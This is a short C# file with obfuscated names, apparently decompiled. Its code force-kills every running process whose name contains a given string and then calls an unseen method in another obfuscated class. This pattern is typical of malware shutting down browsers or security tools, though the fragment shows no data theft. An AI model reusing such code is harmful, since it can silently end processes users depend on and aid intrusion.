using System;
using System.Diagnostics;

namespace InTDhhOfzy;

public sealed class LtsOdfdLABleV
{
	public static bool hYaxkPNhvYqe(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void kuSgRWNyczHruv(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (hYaxkPNhvYqe(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					atvFwvQCkKwzkN.TwRlPooOVgtl();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
